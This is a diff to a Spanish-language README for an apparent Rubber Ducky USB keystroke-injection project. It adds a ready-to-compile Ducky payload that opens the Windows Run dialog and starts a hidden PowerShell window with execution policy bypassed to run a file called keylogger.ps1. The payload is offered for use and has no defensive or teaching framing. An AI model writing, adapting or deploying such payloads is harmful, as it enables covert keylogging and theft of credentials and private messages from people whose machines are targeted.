@@ -95,6 +95,16 @@ Para compilar el script Ducky y generar tu propio archivo [`inject.bin`](inject.
 
 Una vez abierto en tu navegador, sigue las instrucciones en la herramienta para codificar tu script y descargar el archivo `inject.bin` listo para usar en la microSD de tu Rubber Ducky.
 
+## :duck: Ejemplo del Rubber Ducky Payload para compilar en el Ducky Encoder adaptado a [`keylogger.ps1`](keylogger.ps1)
+```Rubber Ducky Payload
+DELAY 1500
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1' -WindowStyle Hidden; Start-Sleep 1; exit"
+DELAY 400
+ENTER
+```
+
 ## 🗂️ Exportar el chat a JSON (Telegram Desktop)
 1. Abre Telegram Desktop y entra en el chat del bot.
 2. Abre el menú **⋯** → **Export chat history** / **Exportar historial del chat**.
